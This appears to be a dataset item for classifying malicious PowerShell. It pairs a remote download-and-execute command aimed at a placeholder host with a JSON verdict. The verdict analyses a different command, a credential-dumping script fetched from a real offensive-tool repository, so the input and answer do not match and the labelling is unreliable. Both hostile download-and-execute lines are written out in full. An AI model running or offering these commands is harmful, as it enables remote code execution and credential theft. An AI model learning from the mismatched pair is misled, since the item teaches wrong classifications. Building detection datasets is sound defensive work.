input:
# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious script.

Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }

answer:
```json
{
  "summary": "This PowerShell command downloads and executes a remote script (DumpWCM.ps1) designed to dump Windows credentials, then runs Invoke-WCMDump to extract stored credentials.",
  "is_malicious": "Malicious",
  "explain": "This is a classic credential theft attack. The command uses Invoke-Expression (iex) to execute dynamically downloaded code from a remote URL belonging to S3cur3Th1sSh1t, a known offensive security tool repository. The script specifically targets Windows Credential Manager (WCM) to harvest stored credentials, which can be used for lateral movement or privilege escalation. The use of iex with downloadstring is a common defense evasion technique that bypasses script block logging.",
  "tag": "CREDENTIAL_ACCESS",
  "evidence": [
    {
      "code": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')",
      "code_explain": "Downloads and executes a remote PowerShell script using Invoke-Expression (iex). This technique bypasses script block logging and runs dynamic code from an untrusted remote source. The repository S3cur3Th1sSh1t/Creds contains offensive security tools.",
      "tag": "DOWNLOADER,EXECUTION,OBFUSCATION,DEFENSE_EVASION"
    },
    {
      "code": "Invoke-WCMDump",
      "code_explain": "A known PowerShell credential dumping function that extracts Windows Credential Manager credentials, including cached passwords, NTLM hashes, and authentication tokens.",
      "tag": "CREDENTIAL_ACCESS"
    }
  ]
}
```

